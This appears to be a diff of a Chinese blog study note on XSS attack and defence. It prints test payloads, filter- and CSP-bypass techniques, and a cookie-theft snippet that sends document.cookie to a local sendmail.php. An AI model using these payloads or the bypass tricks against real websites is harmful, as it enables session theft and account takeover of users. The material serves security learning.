@@ -23,7 +23,7 @@
 
     <meta name="description" content="客户端的Cookie: 记录登录状态，跟踪用户行为 服务端的Session JavaScript操作Cookie 获取和设置： document.cookie;document.cookie&#x3D;‘name&#x3D;abc’; 无法删除，只能通过更改过期时间删除。 脚本注入网页：XSS(Cross Site Script) &lt;script&gt;alert(1)&lt;&#x2F;script&gt;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="3-XSS 渗透与防御">
+<meta property="og:title" content="3-XSS渗透与防御">
 <meta property="og:url" content="https://tianlipa.github.io/2025/08/msb-03-xss/index.html">
 <meta property="og:site_name" content="tianlipa">
 <meta property="og:description" content="客户端的Cookie: 记录登录状态，跟踪用户行为 服务端的Session JavaScript操作Cookie 获取和设置： document.cookie;document.cookie&#x3D;‘name&#x3D;abc’; 无法删除，只能通过更改过期时间删除。 脚本注入网页：XSS(Cross Site Script) &lt;script&gt;alert(1)&lt;&#x2F;script&gt;">
@@ -44,10 +44,10 @@
 <link rel="canonical" href="https://tianlipa.github.io/2025/08/msb-03-xss/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://tianlipa.github.io/2025/08/msb-03-xss/","path":"2025/08/msb-03-xss/","title":"3-XSS 渗透与防御"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://tianlipa.github.io/2025/08/msb-03-xss/","path":"2025/08/msb-03-xss/","title":"3-XSS渗透与防御"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>3-XSS 渗透与防御 | tianlipa</title>
+<title>3-XSS渗透与防御 | tianlipa</title>
   
 
 
@@ -215,12 +215,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="3-XSS 渗透与防御 | tianlipa">
+      <meta itemprop="name" content="3-XSS渗透与防御 | tianlipa">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          3-XSS 渗透与防御
+          3-XSS渗透与防御
         </h1>
 
         <div class="post-meta-container">
@@ -244,98 +244,98 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><p>客户端的 Cookie: 记录登录状态，跟踪用户行为</p>
-<p>服务端的 Session</p>
-<h2 id="JavaScript 操作 Cookie">JavaScript 操作 Cookie</h2>
+    <div class="post-body" itemprop="articleBody"><p>客户端的Cookie: 记录登录状态，跟踪用户行为</p>
+<p>服务端的Session</p>
+<h2 id="JavaScript操作Cookie">JavaScript操作Cookie</h2>
 <p>获取和设置：</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=‘name=abc’;</span><br></pre></td></tr></table></figure>
 <p>无法删除，只能通过更改过期时间删除。</p>
 <h2 id="脚本注入网页：XSS-Cross-Site-Script">脚本注入网页：XSS(Cross Site Script)</h2>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <span id="more"></span>
-<h3 id="反射型 XSS">反射型 XSS</h3>
+<h3 id="反射型XSS">反射型XSS</h3>
 <p><img src="/img/msb/17376208071206.png" alt=""></p>
 <h3 id="存储型（持久型）XSS">存储型（持久型）XSS</h3>
 <p><img src="/img/msb/17376210736185.png" alt=""></p>
-<h3 id="实例：获取 Cookie 发送邮件">实例：获取 Cookie 发送邮件</h3>
+<h3 id="实例：获取Cookie发送邮件">实例：获取Cookie发送邮件</h3>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(‘img’);</span><br><span class="line">img.<span class="property">width</span> = <span class="number">0</span>;</span><br><span class="line">img.<span class="property">height</span> = <span class="number">0</span>;</span><br><span class="line">img.<span class="property">src</span> = ‘<span class="attr">http</span>:<span class="comment">//localhost/xss/sendmail.php?mycookie=‘+encodeURIComponent(document.cookie); </span></span><br></pre></td></tr></table></figure>
-<h2 id="XSS 检测和利用">XSS 检测和利用</h2>
-<h3 id="测试 payload">测试 payload</h3>
+<h2 id="XSS检测和利用">XSS检测和利用</h2>
+<h3 id="测试payload">测试payload</h3>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(‘<span class="variable constant_">XSS</span>’)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;=‘&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">“&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">%3Cscript%3Ealert(<span class="variable language_">document</span>.<span class="property">cookie</span>)%3C/script%3E</span><br><span class="line">&lt;img src=“<span class="attr">javascript</span>:<span class="title function_">alert</span>(‘<span class="variable constant_">XSS</span>’)”&gt;</span><br><span class="line">onerror=“<span class="title function_">alert</span>(‘<span class="variable constant_">XSS</span>’)”&gt;</span><br></pre></td></tr></table></figure>
-<p>SVG 标签会将 XML 实体解析后加入标签，eval 函数能够接受十六进制的字符串，可用于绕过一些符号过滤。</p>
+<p>SVG标签会将XML实体解析后加入标签，eval函数能够接受十六进制的字符串，可用于绕过一些符号过滤。</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt%#x28;1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&lt;/svg&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>.<span class="property">call</span><span class="string">`<span class="subst">$&#123;‘prompt\x281)’&#125;</span>`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
 <h3 id="自动化检测工具">自动化检测工具</h3>
 <p>XSSER: <a target="_blank" rel="noopener" href="http://xsser.03c8.net">xsser.03c8.net</a></p>
 <p>XSSSTRIKE</p>
-<h2 id="XSS 防御方法">XSS 防御方法</h2>
+<h2 id="XSS防御方法">XSS防御方法</h2>
 <hr>
-<h3 id="反射型 XSS-2">反射型 XSS</h3>
-<p>恶意代码未被服务器储存，每次触发漏洞时，都将恶意代码通过 GET/POST 方式提交，用户输入的内容被直接输出在 HTML 中，然后触发漏洞。</p>
-<p>若注入点在标签内部，则不需要插入标签。例如 script 标签内部，可以直接插入 javascript 语句，类似 SQL 注入，先闭合引号，再注释后面的引号。<br>
-其他标签内，可以先闭合引号，再插入可以执行 javascript 代码的属性进行 XSS 攻击。</p>
-<h3 id="存储型 XSS">存储型 XSS</h3>
-<p>与反射型基本思路相同，都是在后端未对用户输入进行过滤导致的漏洞，但存储型 XSS 将用户输入保存在数据库或其他的服务器存储中，只要服务保存了 XSS 代码，便可造成持续性的影响，相比之下更具威胁性。</p>
-<p>在实际环境中，常见于用户发的帖子或个人信息等页面，其他用户访问时便触发 XSS。</p>
-<h3 id="DOM-Document-Obect-Model- 文档对象模型 - 型 XSS">DOM(Document Obect Model, 文档对象模型)型 XSS</h3>
-<p>漏洞发生于前端而非后端，前端将用户输入直接写入到了 HTML 中。Javascript 具有操作 DOM 的功能，可以提取用户的输入，直接插入到 DOM 中，造成 XSS。</p>
-<p>payload 与反射 / 存储型相同，如<code>name=&lt;script&gt;alert(‘aminos’)&lt;/script&gt;</code></p>
-<p>注意，只有 document.write()函数才会执行 script 标签内的代码，而通过修改 DOM 属性 innerHTML 插入 HTML 内容不会执行其中 script 标签内代码，但可以通过插入 <code>&lt;img scr=x onerror=alert(1)&gt;</code> 的方法执行类似 onerror 属性中的 javascript 代码。</p>
-<h2 id="可以用于执行 XSS 的标签">可以用于执行 XSS 的标签</h2>
+<h3 id="反射型XSS-2">反射型XSS</h3>
+<p>恶意代码未被服务器储存，每次触发漏洞时，都将恶意代码通过GET/POST方式提交，用户输入的内容被直接输出在HTML中，然后触发漏洞。</p>
+<p>若注入点在标签内部，则不需要插入标签。例如script标签内部，可以直接插入javascript语句，类似SQL注入，先闭合引号，再注释后面的引号。<br>
+其他标签内，可以先闭合引号，再插入可以执行javascript代码的属性进行XSS攻击。</p>
+<h3 id="存储型XSS">存储型XSS</h3>
+<p>与反射型基本思路相同，都是在后端未对用户输入进行过滤导致的漏洞，但存储型XSS将用户输入保存在数据库或其他的服务器存储中，只要服务保存了XSS代码，便可造成持续性的影响，相比之下更具威胁性。</p>
+<p>在实际环境中，常见于用户发的帖子或个人信息等页面，其他用户访问时便触发XSS。</p>
+<h3 id="DOM-Document-Obect-Model-文档对象模型-型XSS">DOM(Document Obect Model, 文档对象模型)型XSS</h3>
+<p>漏洞发生于前端而非后端，前端将用户输入直接写入到了HTML中。Javascript具有操作DOM的功能，可以提取用户的输入，直接插入到DOM中，造成XSS。</p>
+<p>payload与反射/存储型相同，如<code>name=&lt;script&gt;alert(‘aminos’)&lt;/script&gt;</code></p>
+<p>注意，只有document.write()函数才会执行script标签内的代码，而通过修改DOM属性innerHTML插入HTML内容不会执行其中script标签内代码，但可以通过插入<code>&lt;img scr=x onerror=alert(1)&gt;</code>的方法执行类似onerror属性中的javascript代码。</p>
+<h2 id="可以用于执行XSS的标签">可以用于执行XSS的标签</h2>
 <ol>
-<li>几乎所有的标签 on 事件，如<code>&lt;h1 onmousemove=“alert(1)”&gt;hello&lt;/h1&gt;</code><br>
-另一个常见的是 img 标签的 onerror 属性</li>
+<li>几乎所有的标签on事件，如<code>&lt;h1 onmousemove=“alert(1)”&gt;hello&lt;/h1&gt;</code><br>
+另一个常见的是img标签的onerror属性</li>
 </ol>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=“<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)”&gt;&lt;/frame&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">“alert(1)”</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="http://xn--portswigger-x12sn617b.net/web-security/cross-site-scripting/cheat-sheet">参考 portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p>
+<p><a target="_blank" rel="noopener" href="http://xn--portswigger-x12sn617b.net/web-security/cross-site-scripting/cheat-sheet">参考portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p>
 <ol start="2">
-<li>HTML5 特性的 XSS，<a target="_blank" rel="noopener" href="http://xn--www-5u3e363r.html5sec.org">参考 www.html5sec.org</a><br>
-很多标签的 on 属性需要用户交互才能完成触发，如<code>&lt;input onfocus=‘alert(1)&gt;</code>，输入框获得焦点后才能触发 alert(1)<br>
-但 HTML5 的 autofocus 可以自动实现聚焦，让需要交互的 XSS 变成了无需交互的 XSS，降低了成本。</li>
+<li>HTML5特性的XSS，<a target="_blank" rel="noopener" href="http://xn--www-5u3e363r.html5sec.org">参考www.html5sec.org</a><br>
+很多标签的on属性需要用户交互才能完成触发，如<code>&lt;input onfocus=‘alert(1)&gt;</code>，输入框获得焦点后才能触发alert(1)<br>
+但HTML5的autofocus可以自动实现聚焦，让需要交互的XSS变成了无需交互的XSS，降低了成本。</li>
 </ol>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus=‘<span class="title function_">alert</span>(<span class="number">1</span>)’ autofocus&gt;</span><br></pre></td></tr></table></figure>
 <ol start="3">
-<li>javascript 伪协议<br>
-如 <code>javascript:void(0)</code> 中，”javascript:”表示 javascript 伪协议，它是由 javascript 引擎来执行的，如</li>
+<li>javascript伪协议<br>
+如<code>javascript:void(0)</code>中，”javascript:”表示javascript伪协议，它是由javascript引擎来执行的，如</li>
 </ol>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a href=“<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)”&gt;click here&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-<p>iframe 标签也可以使用 javascript 伪协议，实现自动触发，如</p>
+<p>iframe标签也可以使用javascript伪协议，实现自动触发，如</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=“<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)”&gt;</span><br></pre></td></tr></table></figure>
 <h2 id="防御">防御</h2>
-<p>过滤主要有 WAF 层和代码层，WAF 层通常在外部，在主机或网络硬件上对 HTTP 请求进行过滤拦截，而代码层是在编写 web 应用的过程中实现对用户输入进行过滤。<br>
-但 javascript 语法非常灵活，所以对于普通的正则匹配和字符串比较，很难拦截 XSS。</p>
+<p>过滤主要有WAF层和代码层，WAF层通常在外部，在主机或网络硬件上对HTTP请求进行过滤拦截，而代码层是在编写web应用的过程中实现对用户输入进行过滤。<br>
+但javascript语法非常灵活，所以对于普通的正则匹配和字符串比较，很难拦截XSS。</p>
 <ol>
 <li>
 <p>富文本过滤<br>
-大多数富文本编辑器都允许用户直接编辑 HTML，从而引入了 XSS 漏洞。常见过滤方式是对用户输入的标签进行限制，我们可以寻找黑名单中遗漏的标签。<br>
-<a target="_blank" rel="noopener" href="http://xn--portswigger-x12sn617b.net/web-security/cross-site-scripting/cheat-sheet">参考 portswigger.net/web-security/cross-site-scripting/cheat-sheet</a><br>
+大多数富文本编辑器都允许用户直接编辑HTML，从而引入了XSS漏洞。常见过滤方式是对用户输入的标签进行限制，我们可以寻找黑名单中遗漏的标签。<br>
+<a target="_blank" rel="noopener" href="http://xn--portswigger-x12sn617b.net/web-security/cross-site-scripting/cheat-sheet">参考portswigger.net/web-security/cross-site-scripting/cheat-sheet</a><br>
 如果过滤器本身存在缺陷，如将黑名单替换为空，则可以采用双写绕过。</p>
 </li>
 <li>
 <p>注入点在标签属性中<br>
-如果没有过滤 &lt; 和 &gt;，可以直接引入新的标签，如果尖括号被过滤，可以插入新的事件属性，如 onload, onmousemove。<br>
-标签的字段支持 HTML 编码，可以借此绕过一些过滤。如：</p>
+如果没有过滤&lt;和&gt;，可以直接引入新的标签，如果尖括号被过滤，可以插入新的事件属性，如onload, onmousemove。<br>
+标签的字段支持HTML编码，可以借此绕过一些过滤。如：</p>
 </li>
 </ol>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img scr=x onerror=“&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x28;&amp;#x31;&amp;#x29;”&gt;</span><br></pre></td></tr></table></figure>
-<p>onerror 内内容即 alert(1)进行 HTML 编码后的结果。</p>
+<p>onerror内内容即alert(1)进行HTML编码后的结果。</p>
 <ol start="3">
-<li>注入点在 script 标签中<br>
-如果注入点被引号包裹，可以像 SQL 注入一样，先闭合引号，再用分号结束语句，然后插入代码。<br>
+<li>注入点在script标签中<br>
+如果注入点被引号包裹，可以像SQL注入一样，先闭合引号，再用分号结束语句，然后插入代码。<br>
 如果引号被过滤，且一行存在两个注入点：<br>
 <code>var url=‘http://example.com/?name=&lt;?=$name?&gt;’+’&lt;?=$address?&gt;’</code><br>
 可以用反斜杠使第一个反引号被转义，从第二个引号开始插入代码：<br>
 <code>var url=‘http://example.com/?name=\‘+’;alert(1);\\</code><br>
-\ 是 name 的值，;alert(1);\ 是 address 的值。<br>
-如果存在单词黑名单，如不允许出现 eval 等字符，可以用 unicode 编码绕过。</li>
+\是name的值，;alert(1);\是address的值。<br>
+如果存在单词黑名单，如不允许出现eval等字符，可以用unicode编码绕过。</li>
 </ol>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\u0065\u0076\u0061\<span class="title function_">u006c</span>(‘<span class="title function_">alert</span>(<span class="number">1</span>)’)</span><br></pre></td></tr></table></figure>
 <ol start="4">
-<li>CSP 过滤及其绕过<br>
-CSP(Content Security Policy)是一个额外的安全层，用于检测并缓解某些特定类型的注入，包括 XSS 和数据注入等。<br>
+<li>CSP过滤及其绕过<br>
+CSP(Content Security Policy)是一个额外的安全层，用于检测并缓解某些特定类型的注入，包括XSS和数据注入等。<br>
 <img src="/img/msb/17376413018599.png" alt=""><br>
-绕过 script-scr ‘self’, self 意味着只允许加载同域名目录下的脚本，所以我们可以寻找文件上传或 jsonp 借口。<br>
-需要注意的是，如果是图片上传接口，即访问资源时的 Content-Type 为 image/png, 浏览器会拒绝将其作为脚本执行。<br>
-jsonp 接口一般采用?callback=xxx 的方式传参，如<code>xxx(&#123;“result”:”success”&#125;)</code><br>
+绕过script-scr ‘self’, self意味着只允许加载同域名目录下的脚本，所以我们可以寻找文件上传或jsonp借口。<br>
+需要注意的是，如果是图片上传接口，即访问资源时的Content-Type为image/png, 浏览器会拒绝将其作为脚本执行。<br>
+jsonp接口一般采用?callback=xxx的方式传参，如<code>xxx(&#123;“result”:”success”&#125;)</code><br>
 此时若传<code>callback=alert(1);//</code>，就会产生这样的返回：<br>
 <code>alert(1);//(&#123;“result”:”success”&#125;)</code></li>
 </ol>
@@ -357,13 +357,13 @@ jsonp 接口一般采用?callback=xxx 的方式传参，如<code>xxx(&#123;“re
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2025/08/msb-02-sql-injection/" rel="prev" title="2-SQL 注入">
-                  <i class="fa fa-angle-left"></i> 2-SQL 注入
+                <a href="/2025/08/msb-02-sql-injection/" rel="prev" title="2-SQL注入">
+                  <i class="fa fa-angle-left"></i> 2-SQL注入
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2025/08/msb-04-csrf/" rel="next" title="4-CSRF 漏洞渗透与防御">
-                  4-CSRF 漏洞渗透与防御 <i class="fa fa-angle-right"></i>
+                <a href="/2025/08/msb-04-csrf/" rel="next" title="4-CSRF漏洞渗透与防御">
+                  4-CSRF漏洞渗透与防御 <i class="fa fa-angle-right"></i>
                 </a>
             </div>
           </div>
